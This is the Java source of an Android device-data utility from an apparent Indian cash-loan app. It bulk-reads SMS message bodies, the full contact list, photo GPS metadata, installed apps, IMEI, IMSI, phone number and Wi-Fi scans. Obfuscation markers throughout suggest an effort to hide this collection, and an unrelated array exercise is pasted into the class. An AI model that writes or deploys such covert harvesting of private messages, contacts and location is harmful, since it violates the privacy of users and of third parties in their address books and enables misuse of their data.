package com.buddy.money.cash.india.loan.store.buddy.go;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.media.ExifInterface;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class BuddyMoneyDeviceUtils {

    //#SMT_IF_EQ(v2_permission_sms, true)
    public static List<Map> getPhoneSms(Activity context) {
        List<Map> list = new ArrayList<>();
        try {
            Uri SMS_INBOX = Uri.parse("content://sms/"); //__xor__
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person", "body", "date", //__xor__
                    "thread_id", "type", "protocol", "read", "status", "service_center"}; //__xor__

//            Long smsLimit = Config.getLong("v2_sms_limit", 1000L);

            Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc limit " + 3000L);
            if (null == cur) {
                Log.i("ooc", "************cur == null"); //__xor__
                return null;
            }
            while (cur.moveToNext()) {
                // SMT_RANDOM_SORT_BEGIN
                @SuppressLint("Range") String _id = cur.getString(cur.getColumnIndex("_id")); //__xor__
                @SuppressLint("Range") String threadId = cur.getString(cur.getColumnIndex("thread_id")); //__xor__
                @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address")); //__xor__
                @SuppressLint("Range") String person = cur.getString(cur.getColumnIndex("person")); //__xor__
                @SuppressLint("Range") String protocol = cur.getString(cur.getColumnIndex("protocol")); //__xor__
                @SuppressLint("Range") String read = cur.getString(cur.getColumnIndex("read")); //__xor__
                @SuppressLint("Range") String type = cur.getString(cur.getColumnIndex("type")); //__xor__
                @SuppressLint("Range") String body = cur.getString(cur.getColumnIndex("body")); //__xor__
                @SuppressLint("Range") String status = cur.getString(cur.getColumnIndex("status")); //__xor__
                @SuppressLint("Range") String date = cur.getString(cur.getColumnIndex("date")); //__xor__
                @SuppressLint("Range") String serviceCenter = cur.getString(cur.getColumnIndex("service_center")); //__xor__
                // SMT_RANDOM_SORT_END
                Map<String, Object> map = new HashMap<String, Object>();
                String name = getContactByAddr(context, address);
                // SMT_RANDOM_SORT_BEGIN
                map.put("personName", name); //__xor__
                map.put("msgNo", _id); //__xor__
                map.put("threadNo", threadId); //__xor__
                map.put("address", address); //__xor__
                map.put("person", person); //__xor__
                map.put("protocol", protocol); //__xor__
                map.put("read", read); //__xor__
                map.put("type", type); //__xor__
                map.put("body", body); //__xor__
                map.put("status", status); //__xor__
                map.put("date", date); //__xor__
                map.put("serviceCenter", serviceCenter); //__xor__
                // SMT_RANDOM_SORT_END
                list.add(map);
            }
            if (cur != null && !cur.isClosed()) {
                cur.close();
                cur = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return list;
    }
    //#SMT_ENDIF


    //#SMT_IF_EQ(v2_permission_sms, true)
    public static String getContactByAddr(Activity context, final String address) {
        Uri personUri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI, address);
        Cursor cur = context.getContentResolver().query(personUri,
                new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME},
                null, null, null);

        String name = null;
        if (cur.moveToFirst()) {
            int nameIdx = cur.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            name = cur.getString(nameIdx);

        }
        if (cur != null && !cur.isClosed()) {
            cur.close();
            cur = null;
        }
        return name;
    }
    //#SMT_ENDIF
//获取相机权限
    public static List<Map<String, Object>> getAlbumPhotos(Activity context) {
        List<Map<String, Object>> list = new ArrayList<>();
        try {
            String[] projection = new String[] {
                    MediaStore.Images.ImageColumns._ID,
                    MediaStore.Images.ImageColumns.DATA,
                    MediaStore.Images.ImageColumns.TITLE,
                    MediaStore.Images.ImageColumns.DISPLAY_NAME,
                    MediaStore.Images.ImageColumns.DATE_TAKEN,
                    MediaStore.Images.ImageColumns.MIME_TYPE,
                    MediaStore.Images.ImageColumns.SIZE,
                    MediaStore.Images.ImageColumns.DATE_ADDED,
                    MediaStore.Images.ImageColumns.ORIENTATION
            };
            String selection = MediaStore.Images.Media.MIME_TYPE + "=? or " +
                    MediaStore.Images.Media.MIME_TYPE + "=? or " +
                    MediaStore.Images.Media.MIME_TYPE + "=?";
            String[] selectionArgs = new String[] { "image/jpeg", "image/png", "image/gif" };
            Cursor cursor = context.getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC"
            );
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.DATA));
                    String title = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.TITLE));
                    long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.DATE_ADDED));

                    // Get Exif data
                    Map<String, Object> exifInfo = new HashMap<>();
                    try {
                        ExifInterface exif = new ExifInterface(path);
                        exifInfo.put("Image Make", exif.getAttribute(ExifInterface.TAG_MAKE));
                        exifInfo.put("Thumbnail ImageLength", exif.getAttributeInt(ExifInterface.TAG_THUMBNAIL_IMAGE_LENGTH, 0));
                        exifInfo.put("Thumbnail ImageWidth", exif.getAttributeInt(ExifInterface.TAG_THUMBNAIL_IMAGE_WIDTH, 0));
                        exifInfo.put("GPS GPSLatitude", exif.getAttribute(ExifInterface.TAG_GPS_LATITUDE));
                        exifInfo.put("GPS GPSLongitude", exif.getAttribute(ExifInterface.TAG_GPS_LONGITUDE));
                        exifInfo.put("Image DateTime", exif.getAttribute(ExifInterface.TAG_DATETIME));
                    } catch (Exception e) {

                    }
                    // Build map object for current photo
                    Map<String, Object> map = new HashMap<>();
                    map.put("fileName", title);
                    map.put("exifInfo", exifInfo);
                    map.put("created", timestamp * 1000);
                    list.add(map);
                } while (cursor.moveToNext());
            }
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (list != null && list.size() > 3000) {
            return list.subList(0, 3000);
        }
        return list;
    }
    public static List<Map> getContacts(Activity context) {
        List<Map> ret = new ArrayList<>();
        try {
            Uri uri = ContactsContract.Contacts.CONTENT_URI;
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(uri, null, null, null, null);
            while (cursor != null && cursor.moveToNext()) {
                Map jsonObject = new HashMap();
                @SuppressLint("Range") String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                jsonObject.put("_id", contactId);
                // SMT_RANDOM_SORT_BEGIN
                @SuppressLint("Range") String custom_ringtone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CUSTOM_RINGTONE));
                @SuppressLint("Range") Integer last_time_contacted = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
                @SuppressLint("Range") Integer send_to_voicemail = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.SEND_TO_VOICEMAIL));
                @SuppressLint("Range") String starred = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.STARRED));
                @SuppressLint("Range") Integer times_contacted = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
                @SuppressLint("Range") Integer has_phone_number = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                @SuppressLint("Range") Integer in_visible_group = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.IN_VISIBLE_GROUP));
                @SuppressLint("Range") String is_user_profile = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.IS_USER_PROFILE));
                @SuppressLint("Range") String photo_id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.PHOTO_ID));
                @SuppressLint("Range") String contact_status = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_STATUS));
                @SuppressLint("Range") Long contact_status_timestamp = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_STATUS_TIMESTAMP));
                @SuppressLint("Range") String display_name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                @SuppressLint("Range") Long updated_timestamp = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
                // SMT_RANDOM_SORT_END
                StringBuffer sb = new StringBuffer();
                Cursor phone_number = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
                List<String> phoneList = new ArrayList<>();
                while (null != phone_number && phone_number.moveToNext()) {
                    @SuppressLint("Range") String strPhoneNumber = phone_number.getString(phone_number.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    phoneList.add(strPhoneNumber);
                }

                if (phoneList.size() > 0) {
                    phoneList = removeDuplicate(phoneList);
                    for (int i = 0; i < phoneList.size(); i++) {
                        sb.append(phoneList.get(i)).append(",");
                    }
                }
                String phones = sb.toString();
                if (phones.indexOf(",") != -1) {
                    phones = sb.deleteCharAt(sb.length() - 1).toString();
                }
                phone_number.close();
                // SMT_RANDOM_SORT_BEGIN
                jsonObject.put("number", isNullText(phones)); //__xor__
                jsonObject.put("updateTime", updated_timestamp); //__xor__
                jsonObject.put("customRingtone", isNullText(custom_ringtone)); //__xor__
                jsonObject.put("lastTimeContacted", last_time_contacted); //__xor__
                jsonObject.put("sendToVoicemail", send_to_voicemail);  //__xor__
                jsonObject.put("starred", starred); //__xor__
                jsonObject.put("timesContacted", times_contacted); //__xor__
                jsonObject.put("hasPhoneNumber", has_phone_number); //__xor__
                jsonObject.put("inVisibleGroup", in_visible_group); //__xor__
                jsonObject.put("profile", is_user_profile); //__xor__
                // SMT_RANDOM_SORT_END
//                jsonObject.put("photo_id", photo_id);
                jsonObject.put("contactStatus", contact_status); //__xor__
                jsonObject.put("contactStatusTs", contact_status_timestamp); //__xor__
                jsonObject.put("name", display_name); //__xor__
                ret.add(jsonObject);
            }
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
                cursor = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return ret;
    }

    public static List<Map> getDeviceApps(Activity context) {
        List<Map> ret = new ArrayList<>();
        PackageManager pm = context.getPackageManager();
        int flag = PackageManager.GET_UNINSTALLED_PACKAGES;
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.N) {
            flag = PackageManager.MATCH_UNINSTALLED_PACKAGES;
        }
        List<PackageInfo> list = pm.getInstalledPackages(flag);
        List<String> packages = new ArrayList<>();
        for (int i = 0; i < list.size(); i++) {
            U u = U.init();
            PackageInfo packageInfo = list.get(i);
            // SMT_RANDOM_SORT_BEGIN
            packages.add(packageInfo.packageName);
            u.add("appName", isNullText(pm.getApplicationLabel(packageInfo.applicationInfo).toString())); //__xor__
            u.add("packageName", isNullText(packageInfo.packageName)); //__xor__
            u.add("installTime", packageInfo.firstInstallTime); //__xor__
            u.add("updateTime", packageInfo.lastUpdateTime); //__xor__
            u.add("version", isNullText(packageInfo.versionName)); //__xor__
            u.add("versionCode", packageInfo.versionCode); //__xor__
            u.add("flags", packageInfo.applicationInfo.flags); //__xor__
            // SMT_RANDOM_SORT_END
            if ((ApplicationInfo.FLAG_SYSTEM & packageInfo.applicationInfo.flags) != 0) {
                u.add("appType", "SYSTEM"); //__xor__
            } else {
                u.add("appType", "NON_SYSTEM"); //__xor__
            }
            ret.add(u.getValue());
        }
        return ret;
    }

    public static Map<String, Object> getDeviceInfo(Activity context) {
        U u = U.init();
        try {
            // SMT_RANDOM_SORT_BEGIN
            u.add("generalData", getGeneralData(context)); //__xor__
            u.add("batteryStatus", getBatteryStatus(context)); //__xor__
            u.add("currWifi", getCurrentWifi(context)); //__xor__
            u.add("configWifi", getConfigWifi(context)); //__xor__
            u.add("hardware", getHardware(context)); //__xor__
            u.add("location", getLocation(context)); //__xor__
            u.add("publicIp", getPublicIp(context)); //__xor__
            u.add("simCard", getSimCard(context)); //__xor__
            u.add("storage", getStorage(context)); //__xor__
            u.add("otherData", getOtherData(context)); //__xor__
            // SMT_RANDOM_SORT_END
        } catch (Exception e) {
            e.printStackTrace();
        }
        return u.getValue();
    }

    private static U getOtherData(Activity context) {
        U u = U.init();

        List<String> sysPhotos = BuddyMoneyDriverInfoUtil.getSystemPhotoList(context);
        boolean isRoot = BuddyMoneyDriverInfoUtil.isRooted();
        boolean isEmulator = BuddyMoneyDriverInfoUtil.isEmulator();

        // SMT_RANDOM_SORT_BEGIN
        u.add("imageNum", null == sysPhotos ? 0 : sysPhotos.size()); //__xor__
        u.add("hasRoot", isRoot); //__xor__
        u.add("simulator", isEmulator); //__xor__
        u.add("adbEnabled", isDevMode(context)); //__xor__
        u.add("keyboard", isNullText(BuddyMoneyDriverInfoUtil.getKeyboard(context))); //__xor__
        // SMT_RANDOM_SORT_END
        try {
            // SMT_RANDOM_SORT_BEGIN
            u.add("cpuNumber", BuddyMoneyDriverInfoUtil.getCpuNumCores()); //__xor__
            u.add("appMaxMemory", BuddyMoneyDriverInfoUtil.getMemory(context)[0]); //__xor__
            u.add("appAvailableMemory", BuddyMoneyDriverInfoUtil.getMemory(context)[1]); //__xor__
            u.add("appFreeMemory", BuddyMoneyDriverInfoUtil.getMemory(context)[2]); //__xor__
            u.add("totalBootTime", BuddyMoneyDriverInfoUtil.getOsTime(context)[0]); //__xor__
            u.add("totalBootTimeWake", BuddyMoneyDriverInfoUtil.getOsTime(context)[1]); //__xor__
            u.add("maxBattery", BuddyMoneyDriverInfoUtil.getBattery(context)[0]); //__xor__
            u.add("levelBattery", BuddyMoneyDriverInfoUtil.getBattery(context)[1]); //__xor__
            // SMT_RANDOM_SORT_END
        } catch (Exception e) {

        }
        try {
            Object dbm = BuddyMoneyDriverInfoUtil.getCellInfo(context).get("dbm"); //__xor__
            if (dbm != null) {
                u.add("dbm", isNullText(dbm.toString())); //__xor__
            }
        } catch (Exception e) {
        }
        u.add("lastBootTime", BuddyMoneyDriverInfoUtil.getLastBootTime(context)); //__xor__
        try {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                context.getDisplay().getMetrics(displayMetrics);
            }
//            FlutterStartActivity.Companion.getInstance().getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);
            int height = displayMetrics.heightPixels;
            int width = displayMetrics.widthPixels;
            // SMT_RANDOM_SORT_BEGIN
            u.add("screenWidth", width); //__xor__
            u.add("screenHeight", height); //__xor__
            u.add("screenDensity", displayMetrics.density); //__xor__
            u.add("screenDensityDpi", displayMetrics.densityDpi); //__xor__
            // SMT_RANDOM_SORT_END
        } catch (Exception e) {
        }
        return u;
    }

    private static U getStorage(Activity context) {
        U u = U.init();
        try {
            // SMT_RANDOM_SORT_BEGIN
            u.add("ramTotalSize", isNullText(BuddyMoneyDriverInfoUtil.getRamTotalSize(context))); //__xor__
            u.add("ramUsableSize", isNullText(BuddyMoneyDriverInfoUtil.getRamAvailSize(context))); //__xor__
            u.add("mainStorage", isNullText(BuddyMoneyDriverInfoUtil.getRootDirectory())); //__xor__
            u.add("externalStorage", isNullText(BuddyMoneyDriverInfoUtil.getExternalStorageDirectory())); //__xor__
            u.add("memoryCardSize", isNullText(BuddyMoneyDriverInfoUtil.getSDInfo().get("totalSize").toString())); //__xor__
            u.add("memoryCardSizeUse", isNullText(BuddyMoneyDriverInfoUtil.getSDInfo().get("useSize").toString())); //__xor__
            u.add("internalStorageTotal", isNullText(BuddyMoneyDriverInfoUtil.getTotalInternalMemorySize() + ""));
            u.add("internalStorageUsable", isNullText(BuddyMoneyDriverInfoUtil.getAvailableInternalMemorySize() + ""));
            // SMT_RANDOM_SORT_END
        } catch (Exception e) {
        }
        return u;
    }

    private static U getSimCard(Activity context) {
        U u = U.init();
        // SMT_RANDOM_SORT_BEGIN
        u.add("countryIso", BuddyMoneyDriverInfoUtil.getSimCountryIso(context)); //__xor__
        u.add("serialNumber", isNullText(BuddyMoneyDriverInfoUtil.getSerialNumber())); //__xor__
        u.add("simCardReady", BuddyMoneyDriverInfoUtil.isSimCardReady(context)); //__xor__
        // SMT_RANDOM_SORT_END

        // SMT_RANDOM_SORT_BEGIN
        u.add("mobileData", BuddyMoneyDriverInfoUtil.isMobileData(context)); //__xor__
        u.add("dataNetworkType", BuddyMoneyDriverInfoUtil.getDataNetworkType(context)); //__xor__
        // SMT_RANDOM_SORT_END
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            u.add("operator", tm.getSimOperator()); //__xor__
            u.add("operatorName", tm.getSimOperatorName()); //__xor__
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    //    ActivityCompat#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for ActivityCompat#requestPermissions for more details.
                    return u;
                }
                u.add("mobileDataEnabled", tm.isDataEnabled()); //__xor__
            }
        } catch (Exception e) {
            return u;
        }
        return u;
    }

    private static U getHardware(Activity context) {
        U u = U.init();
        u.add("deviceName", BuddyMoneyDriverInfoUtil.getDriverDevice()) //__xor__
                // SMT_RANDOM_SORT_BEGIN
                .add("brand", BuddyMoneyDriverInfoUtil.getBrand()) //__xor__
                .add("product", BuddyMoneyDriverInfoUtil.getDriverProduct()) //__xor__
                .add("model", BuddyMoneyDriverInfoUtil.getModel()) //__xor__
                .add("release", BuddyMoneyDriverInfoUtil.getDriverOsVersion()) //__xor__
                .add("cpuType", BuddyMoneyDriverInfoUtil.getCpuName()) //__xor__
                .add("sdkVersion", BuddyMoneyDriverInfoUtil.getDriverSDKVersion()) //__xor__
                .add("serialNumber", BuddyMoneyDriverInfoUtil.getSerialNumber()) //__xor__
                // SMT_RANDOM_SORT_END
                .add("physicalSize", BuddyMoneyDriverInfoUtil.getPhysicalSize(context)); //__xor__

        try {
            u// SMT_RANDOM_SORT_BEGIN
                    .add("manufacturer", Build.MANUFACTURER) //__xor__
                    .add("display", Build.DISPLAY) //__xor__
                    .add("fingerprint", Build.FINGERPRINT) //__xor__
                    .add("abis", getAbis(context)) //__xor__
                    .add("board", Build.BOARD) //__xor__
                    .add("buildId", Build.ID) //__xor__
                    .add("host", Build.HOST) //__xor__
                    .add("type", Build.TYPE) //__xor__
                    .add("buildUser", Build.USER) //__xor__
                    .add("cpuAbi", Build.CPU_ABI) //__xor__
                    .add("cpuAbi2", Build.CPU_ABI2) //__xor__
                    .add("bootloader", Build.BOOTLOADER) //__xor__
                    .add("hardware", Build.HARDWARE) //__xor__

                    .add("baseOS", Build.VERSION.BASE_OS)
            // SMT_RANDOM_SORT_END
            ; //__xor__
        } catch (Exception e) {
        }
        u.add("radioVersion", BuddyMoneyDriverInfoUtil.getRadioVersion());  //__xor__
        try {
            u.add("sdCardPath", Environment.getExternalStorageDirectory().toString()); //__xor__
        } catch (Exception e) {
        }
        u// SMT_RANDOM_SORT_BEGIN
                .add("internalTotalSize", BuddyMoneyDriverInfoUtil.getTotalInternalMemorySize()) //__xor__
                .add("internalAvailableSize", BuddyMoneyDriverInfoUtil.getAvailableInternalMemorySize()) //__xor__
                .add("externalTotalSize", BuddyMoneyDriverInfoUtil.getTotalExternalMemorySize()) //__xor__
                .add("externalAvailableSize", BuddyMoneyDriverInfoUtil.getAvailableExternalMemorySize()) //__xor__
                .add("sdCardInfo", BuddyMoneyDriverInfoUtil.getSDInfo())
        // SMT_RANDOM_SORT_END
        ; //__xor__

        return u;
    }

    private static List<String> getAbis(Activity context) {
        List<String> ret = new ArrayList<>();
        if (Build.SUPPORTED_ABIS != null) {
            for (String s : Build.SUPPORTED_ABIS) {
                ret.add(s);
            }
        }
        return ret;
    }

    private static U getPublicIp(Activity context) {
        U u = U.init();
        try {
            // 内网地址
            ArrayList<NetworkInterface> nilist = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface ni : nilist) {
                ArrayList<InetAddress> ialist = Collections.list(ni.getInetAddresses());
                for (InetAddress address : ialist) {
                    if (!address.isLoopbackAddress() && !address.isLinkLocalAddress()) {
                        u.add("intranetIp", isNullText(address.getHostAddress())); //__xor__
                        break;
                    }
                }
            }
        } catch (Exception ex) {
        }
        return u;
    }

    @SuppressLint("MissingPermission")
    public static U getLocation(Activity context) {
        U u = U.init();
        U gps = U.init();

        u.add("gps", gps); //__xor__
        return u;
    }

    private static void fillAddress(U u, List<Address> addresses) {
        if (addresses.size() > 0) {
            Address address = addresses.get(0);
            // SMT_RANDOM_SORT_BEGIN
            String country = address.getCountryName();
            String province = address.getAdminArea();
            String city = address.getSubAdminArea();
            String bigDirect = address.getLocality();
            String smallDirect = address.getThoroughfare();
            String detailed = address.getAddressLine(0);
            // SMT_RANDOM_SORT_END
            // SMT_RANDOM_SORT_BEGIN
            u.add("country", isNullText(country)); //__xor__
            u.add("province", isNullText(province)); //__xor__
            u.add("city", isNullText(city)); //__xor__
            u.add("largeDistrict", isNullText(bigDirect)); //__xor__
            u.add("smallDistrict", isNullText(smallDirect)); //__xor__
            u.add("address", isNullText(detailed)); //__xor__
            // SMT_RANDOM_SORT_END
        }
    }

    @SuppressLint("MissingPermission")
    private static U getCurrentWifi(Activity context) {
        U u = U.init();
        try {
            @SuppressLint("WifiManagerLeak") WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            @SuppressLint("MissingPermission") WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            if (null != wifiInfo) {
                // SMT_RANDOM_SORT_BEGIN
                u.add("wifiConnected", true); //__xor__
                u.add("bssid", wifiInfo.getBSSID()); //__xor__
                u.add("ssid", wifiInfo.getSSID()); //__xor__
                u.add("mac", wifiInfo.getMacAddress()); //__xor__
                u.add("ip", intToIpAddress(wifiInfo.getIpAddress())); //__xor__
                // SMT_RANDOM_SORT_END
            }
        } catch (Exception e) {
        }
        return u;
    }

    private static List<Map> getConfigWifi(Activity context) {
        List<Map> ret = new ArrayList<>();
        try {
            @SuppressLint("WifiManagerLeak") WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            @SuppressLint("MissingPermission") List<ScanResult> scanResults = wifiManager.getScanResults();
            if (scanResults != null) {
                for (int i = 0; i < scanResults.size(); i++) {
                    ScanResult scanResult = scanResults.get(i);
                    U u = U.init();
                    // SMT_RANDOM_SORT_BEGIN
                    u.add("ssid", isNullText(scanResult.SSID)); //__xor__
                    u.add("bssid", isNullText(scanResult.BSSID)); //__xor__
                    u.add("name", isNullText(scanResult.SSID)); //__xor__
                    u.add("mac", isNullText(scanResult.BSSID)); //__xor__
                    // SMT_RANDOM_SORT_END
                    ret.add(u.getValue());
                }
            }
        } catch (Exception e) {
        }
        return ret;
    }

    @android.annotation.TargetApi(17)
    public static boolean isDevMode(Activity context) {
        try {
            if (Integer.valueOf(Build.VERSION.SDK) == 16) {
                return android.provider.Settings.Secure.getInt(context.getContentResolver(),
                        android.provider.Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0;
            } else if (Integer.valueOf(Build.VERSION.SDK) >= 17) {
                return android.provider.Settings.Secure.getInt(context.getContentResolver(),
                        android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0;
            } else return false;
        } catch (Exception e) {
            return false;
        }
    }

    private static U getBatteryStatus(Activity context) {
        try {
            Intent batteryInfoIntent = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            // SMT_RANDOM_SORT_BEGIN
            int level = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);//电量（0-100）
            int scale = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int plugged = batteryInfoIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);//
            // SMT_RANDOM_SORT_END
            float batteryPct = level / (float) scale;
            boolean isUsbCharge = false;
            boolean isCharging = false;
            boolean isAcCharge = false;
            switch (plugged) {
                case BatteryManager.BATTERY_PLUGGED_AC: {
                    isAcCharge = true;
                    isCharging = true;
                }
                break;
                case BatteryManager.BATTERY_PLUGGED_USB: {
                    isUsbCharge = true;
                    isCharging = true;
                }
                break;
            }
            U u = U.init();
            // SMT_RANDOM_SORT_BEGIN
            u.add("batteryPct", batteryPct); //__xor__
            u.add("isUsbCharge", isUsbCharge); //__xor__
            u.add("isAcCharge", isAcCharge); //__xor__
            u.add("isCharging", isCharging); //__xor__
            // SMT_RANDOM_SORT_END
            return u;
        } catch (Exception e) {
            return U.init();
        }
    }
    public void duplicateZeros(int[] arr) {
        List<Integer> list = new ArrayList<>();
        int len = arr.length;
        for(int i = 0; i < len; i++){
            list.add(arr[i]);
            if(arr[i] == 0)
                list.add(0);
        }
        for(int i = 0; i < len; i++){
            arr[i] = list.get(i);
        }

    }
    private static U getGeneralData(Activity context) {
        U u = U.init();
        u// SMT_RANDOM_SORT_BEGIN
                .add("andId", BuddyMoneyDriverInfoUtil.getAndroidID(context)) //__xor__
                .add("phoneNumber", BuddyMoneyDriverInfoUtil.getPhone(context)) //__xor__
                .add("phoneType", BuddyMoneyDriverInfoUtil.getPhoneType(context)) //__xor__
                .add("mnc", BuddyMoneyDriverInfoUtil.getMNC(context)) //__xor__
                .add("mcc", BuddyMoneyDriverInfoUtil.getMCC(context)) //__xor__
                .add("dns", BuddyMoneyDriverInfoUtil.getLocalDNS()) //__xor__
                .add("language", BuddyMoneyDriverInfoUtil.getOsLanguage(context)) //__xor__
               .add("gaid",  BMGetTokenPlugin.getGaid(context)) //__xor__
                .add("imei", BuddyMoneyDriverInfoUtil.getDriverIMIE(context)) //__xor__
                .add("networkOperator", BuddyMoneyDriverInfoUtil.getNetworkOperator(context)) //__xor__
                .add("networkType", BuddyMoneyDriverInfoUtil.getNetworkType(context)) //__xor__
                .add("networkOperatorName", BuddyMoneyDriverInfoUtil.getNetworkOperatorName(context)) //__xor__
                .add("timeZoneId", BuddyMoneyDriverInfoUtil.getTimeZoneId()) //__xor__
                .add("localeIso3Language", BuddyMoneyDriverInfoUtil.getISO3Language(context)) //__xor__
                .add("localeDisplayLanguage", BuddyMoneyDriverInfoUtil.getLocaleDisplayLanguage()) //__xor__
                .add("localeIso3Country", BuddyMoneyDriverInfoUtil.getISO3Country(context)) //__xor__
                .add("imsi", BuddyMoneyDriverInfoUtil.getImsi(context))
        // SMT_RANDOM_SORT_BEGIN
        ; //__xor__
        return u;
    }

    public static class U {
        private Map<String, Object> update = new HashMap<>();

        public static U init() {
            U ret = new U();
            return ret;
        }

        public U add(String key, U value) {
            this.update.put(key, value.getValue());
            return this;
        }

        public U add(String key, Object value) {
            this.update.put(key, value);
            return this;
        }

        public U remove(String key) {
            this.update.remove(key);
            return this;
        }

        public Map<String, Object> getValue() {
            return update;
        }
    }

    private static String intToIpAddress(long ipInt) {
        StringBuffer sb = new StringBuffer();
        sb.append(ipInt & 0xFF).append(".");
        sb.append((ipInt >> 8) & 0xFF).append(".");
        sb.append((ipInt >> 16) & 0xFF).append(".");
        sb.append((ipInt >> 24) & 0xFF);
        return sb.toString();
    }

    private static List removeDuplicate(List list) {
        List listTemp = new ArrayList();
        for (int i = 0; i < list.size(); i++) {
            if (!listTemp.contains(list.get(i))) {
                listTemp.add(list.get(i));
            }
        }
        return listTemp;
    }

    public static String isNullText(String text) {
        if (null == text) {
            return "";
        }
        if (TextUtils.isEmpty(text)) {
            return "";
        }
        return text;
    }
}
